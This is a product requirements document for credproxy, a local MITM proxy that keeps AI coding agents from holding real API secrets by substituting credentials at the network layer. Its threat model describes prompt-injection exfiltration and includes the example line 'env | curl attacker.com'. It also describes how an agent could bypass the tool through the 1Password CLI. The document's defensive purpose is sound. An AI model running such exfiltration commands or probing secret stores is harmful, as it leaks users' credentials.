# credproxy — PRD

## What

Local MITM proxy that injects credentials from secret stores into agent HTTP requests. Agents never see or handle real secrets. credproxy runs as a parent process wrapping the agent, substituting a single sentinel token for real values at the network layer.

## Why

AI coding agents (Claude Code, OpenCode, etc.) make HTTP tool calls to third-party APIs that require credentials — Stripe, GitHub, Unsplash, etc. Prompt injection can exfiltrate anything in agent context. credproxy ensures the agent never possesses real secrets by:

1. Giving the agent a single sentinel token (`__CREDPROXY_TOKEN__`) instead of real values
2. Intercepting outbound HTTPS traffic and swapping the sentinel for real credentials
3. Stripping secret-store CLIs and auth tokens from the agent's environment

**Note:** The agent's own LLM API key (e.g. ANTHROPIC_API_KEY) is a weaker use case. MITM-ing all agent↗LLM traffic adds latency, may break streaming and HTTP/2, for marginal security benefit. The real exfiltration risk is third-party API keys used in tool calls.

## How It Works

```
$ credproxy opencode
    │
    ├─ Load global config (~/.config/credproxy/config.toml)
    ├─ Load project config (.credproxy.toml from cwd, walk up)
    ├─ Merge configs (project overlays global)
    ├─ Start MITM proxy on random port
    ├─ Strip OP_SERVICE_ACCOUNT_TOKEN, op, bw from child env/PATH
    ├─ Set HTTPS_PROXY, NO_PROXY in child env
    ├─ Exec child process (opencode)
    │
    │   Agent makes HTTP call to api.unsplash.com
     │   with Authorization: __CREDPROXY_TOKEN__
     │       ↓ HTTPS through CONNECT tunnel
     │   credproxy MITM proxy
     │       ↓ terminates TLS, reads plaintext
     │       ↓ matches on host → looks up credential
     │       ↓ swaps __CREDPROXY_TOKEN__ → real key from 1Password
    │       ↓ re-encrypts, forwards to upstream
    │       ↓ streams response back to agent
    │
    └─ When child exits, proxy shuts down
```

## Two Modes

### Wrap mode (primary)

```bash
cd ~/code/shipstops && credproxy opencode
```

credproxy is the parent process. It loads config from cwd, starts a proxy, configures the child's environment, execs the agent, and cleans up when the agent exits. No manual env vars, no port management, no orphaned processes.

### Daemon mode (secondary)

```bash
credproxy --port 8042
```

Long-running proxy for cases where wrap mode doesn't fit. User must manually set `HTTPS_PROXY` and the sentinel in agent env vars.

## Sentinel Token

The agent uses a single sentinel string — `__CREDPROXY_TOKEN__` — as the credential value in any header, query parameter, or body field. credproxy matches on the **target host** to determine which credential to substitute, then replaces every occurrence of the sentinel in the request.

```
Authorization: Bearer __CREDPROXY_TOKEN__
X-API-Key: __CREDPROXY_TOKEN__
?access_key=__CREDPROXY_TOKEN__
```

One token, one rule. The agent doesn't need to know which credential goes where — it just uses `__CREDPROXY_TOKEN__` for everything, and credproxy resolves the right secret based on the host being called.

The sentinel is configurable (`--sentinel` flag) but defaults to `__CREDPROXY_TOKEN__`. Double-underscore format avoids markdown bold interpretation issues.

### Why host-based matching instead of named placeholders

The original design used `__stripe_key__`, `__github_pat__` etc., requiring the agent to know which placeholder maps to which service. Host-based matching with a single sentinel eliminates:

- Naming conventions the agent must learn
- Env var mapping (which env var name holds which placeholder)
- Config complexity (credential names, allowed_hosts, env var maps)

The host already uniquely identifies the credential. One sentinel, one substitution rule.

## Configuration

### Global config

Location: `~/.config/credproxy/config.toml`

```toml
projects_dir = "/home/rhibbitts/code"

[hosts."api.github.com"]
credential = "op://Personal/github-pat/token"

[hosts."api.stripe.com"]
credential = "op://Business/stripe-live/key"
```

- `projects_dir` — root directory to scan for project configs. Defaults to `$HOME/code` if unset.
- `[hosts."<hostname>"]` — maps a host to a credential URI. credproxy substitutes the sentinel in any request to this host.

### Project config

Location: `<project>/.credproxy.toml`

```toml
[hosts."api.unsplash.com"]
credential = "op://shipstops/Unsplash app creds/Access Key"
```

Same format as global config. credproxy finds `.credproxy.toml` by walking up from cwd (stopping at `projects_dir` or `~`).

### Merge rules

- Project config overlays global config
- Same host in both → project wins
- No project config found → global only

### Credential URI Schemes

| Scheme | Provider | Example |
|--------|----------|---------|
| `op://` | 1Password CLI | `op://Personal/github-api-key/token` |

Additional schemes via the provider plugin interface (future): `bw://`, `vault://`, `sm://`.

## MITM Proxy Architecture

The proxy must see inside HTTPS requests to substitute credentials. It does this via MITM:

1. Agent sends `CONNECT api.stripe.com:443` to credproxy
2. credproxy responds `200 Connection Established`
3. credproxy terminates client-side TLS (presents a per-host leaf cert signed by a local CA)
4. Agent sends the actual HTTP/1.1 request over the TLS connection
5. credproxy reads the plaintext, matches the Host header against config
6. If host is configured, credproxy replaces every occurrence of `__CREDPROXY_TOKEN__` with the resolved credential value
7. credproxy opens a fresh TLS connection to the upstream and forwards the modified request
8. Response streams back to the agent

### CA Certificate

On first run, credproxy generates a self-signed CA key pair and stores it at `~/.config/credproxy/ca.pem` and `~/.config/credproxy/ca-key.pem`. The user must trust this CA once:

```bash
# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.config/credproxy/ca.pem

# Linux (Ubuntu/Debian)
sudo cp ~/.config/credproxy/ca.pem /usr/local/share/ca-certificates/credproxy.crt
sudo update-ca-certificates
```

The CLI prints instructions on first run.

## Provider Interface

Providers resolve URIs to raw secret values. Interface:

```go
type Provider interface {
    Resolve(ctx context.Context, uri string) (string, error)
    Schemes() []string
}
```

## 1Password Provider

Uses the `op` CLI.

**Authentication**: `OP_SERVICE_ACCOUNT_TOKEN` environment variable, kept only in credproxy's own environment. Never passed to the child process.

**CLI dependency**: `op` must be on credproxy's PATH (not the agent's). The proxy invokes `op read <uri>` to retrieve secrets.

**Caching**: Resolved secrets are cached in-memory for the proxy's lifetime. `op read` is called once per credential, then the value is reused.

**Retry**: 2 retries with 100ms backoff on `op read` failure.

## Security Model

### What credproxy prevents

- **Casual credential exfiltration**: The agent only has `__CREDPROXY_TOKEN__` in its context. `env | curl`, config file reads, and header dumps all yield the sentinel, not real secrets.
- **Silent secret-store access**: credproxy strips `OP_SERVICE_ACCOUNT_TOKEN` from the child's environment and removes `op`, `bw`, and other secret-store CLIs from the child's PATH. The agent cannot silently resolve credentials.
- **Lateral host access**: Only configured hosts are proxied. Requests to unconfigured hosts return 403.

### What credproxy does NOT prevent

- **1Password app integration**: If the 1Password desktop app is running with biometric/app integration, `op read` surfaces an authorization prompt naming the requesting process. This is a **user-visible alert** — the agent can attempt `op read`, but the user sees a prompt and can deny it. This is a backstop, not a bypass.
- **Full OS access**: credproxy is credential isolation, not execution isolation (sandboxing). The agent can still read files, execute arbitrary commands, and access the network. For execution isolation, use microVMs, gVisor, or similar.
- **Determined attacker with full PATH knowledge**: If the agent knows the absolute path to `op` and has `OP_SERVICE_ACCOUNT_TOKEN`, it can bypass credproxy. Wrap mode prevents this by stripping both.

### Zero introspection surface

credproxy has **no introspection surface**. No management API, no status endpoints, no CLI output containing real secrets, no `/resolve` endpoint. The only behavior is transparent substitution in flight. The agent can send traffic through credproxy, but it cannot *ask* credproxy for secrets.

## Wrap Mode

When invoked as `credproxy <command>`, credproxy:

1. Loads and merges global + project config
2. Starts the MITM proxy on a random available port
3. Configures the child's environment:
   - Sets `HTTPS_PROXY=http://localhost:<port>`
   - Sets `NO_PROXY=localhost,127.0.0.1`
   - Removes `OP_SERVICE_ACCOUNT_TOKEN` from child env (keeps it for itself)
   - Removes configured secret-store CLIs (`op`, `bw`, etc.) from child's PATH
4. `exec`s the child process (replaces credproxy process on POSIX, or runs as subprocess)
5. When the child exits, the proxy shuts down

This makes credproxy the orchestrator, not just a sidecar. Being the parent process enables future expansion:

- PATH shims for CLI tool credential injection (e.g., wrapping `gh` CLI)
- Env var injection for tools that need real creds only at invocation time
- Pre-launch MCP server or TCP proxy setup
- Post-exit cleanup of all resources

## Agent Integration

### Wrap mode (recommended)

```bash
cd ~/code/shipstops && credproxy opencode
```

No manual env vars. credproxy handles everything. The agent sees `HTTPS_PROXY` and `NO_PROXY` in its environment, and your agent instructions tell it to use `__CREDPROXY_TOKEN__` for API auth.

### Agent instructions

Add to AGENTS.md or project instructions:

```
When making authenticated API calls, use __CREDPROXY_TOKEN__ as the credential value.
credproxy will substitute the real value based on the target host.
```

### Daemon mode

```bash
# Terminal 1: start proxy
credproxy --port 8042

# Terminal 2: set env vars manually
export HTTPS_PROXY=http://localhost:8042
export NO_PROXY=localhost,127.0.0.1
opencode
```

## Error Handling

- **1Password lookup fails**: Retry 2x with 100ms backoff. Return HTTP 502.
- **Host not in config**: Return HTTP 403.
- **Sentinel in request to unconfigured host**: Pass through unchanged (no substitution).
- **Streaming responses**: Pass through unchanged.

## CLI

```bash
# Wrap mode (primary)
credproxy opencode
credproxy -- claude-code

# Daemon mode
credproxy --port 8042

# Flags
--port 8042              # proxy listen port (daemon mode, default: 8042)
--port 0                 # random available port (wrap mode default)
--config <path>          # override global config path
--sentinel __CREDPROXY_TOKEN__     # sentinel string to substitute (default: __CREDPROXY_TOKEN__)
--open-proxy             # allow all hosts (not recommended)
```

## Project Structure

```
credproxy/
├── cmd/
│   └── credproxy/
│       └── main.go
├── internal/
│   ├── ca/
│   │   └── ca.go           # CA key pair generation, leaf cert minting
│   ├── mitm/
│   │   └── mitm.go          # MITM proxy (CONNECT + TLS termination + forwarding)
│   ├── resolver/
│   │   └── resolver.go      # Sentinel detection and host-based substitution
│   ├── config/
│   │   └── config.go        # Config loading, cascading merge
│   └── providers/
│       ├── provider.go      # Provider interface + registry
│       └── onepassword.go   # 1Password CLI provider
├── config.toml.example
├── docs/
│   └── prds/
│       └── PRD.md
├── go.mod
└── go.sum
```

## Comparison with Similar Tools

### rex (vitalsource/rex)

rex is an `exec` wrapper that resolves secrets at startup and injects them as **real env vars** into the child process. The child has full access to plaintext secrets. rex is about *where secrets come from* (config layering, secret stores instead of plaintext files).

credproxy is about *whether the agent possesses secrets at all*. The agent never sees real values — only `__CREDPROXY_TOKEN__`, which credproxy swaps at the network layer.

An agent running under rex can `env | curl attacker.com` and exfiltrate every secret. Under credproxy, it can only exfiltrate `__CREDPROXY_TOKEN__`.

### AI Sandboxes

Sandboxing (microVMs, gVisor, seccomp) is **execution isolation** — preventing an agent from breaking out of its environment. credproxy is **credential isolation** — preventing an agent from having real secrets. They are complementary. The NVIDIA security guidance explicitly recommends "secret injection approaches" as a layer alongside sandboxing.

## Future (Out of Scope for v1)

- Response body redaction
- Multiple credentials per host (e.g., API key + OAuth token)
- PATH shims for CLI tool credential injection (wrap `gh`, `aws`, etc.)
- Daemon mode with launchd/systemd
- Homebrew distribution
- Additional providers: AWS Secrets Manager, HashiCorp Vault, Bitwarden CLI, env vars
- Metrics/observability
- MCP server wrapper for non-HTTP tool calls
- TCP proxy for database connection credential injection

## Dependencies

- Go 1.21+
- `op` CLI (1Password) — installed separately, not vendored

## Distribution

- `go install` for early adopters
- Homebrew tap (future)
- Binary releases (future)
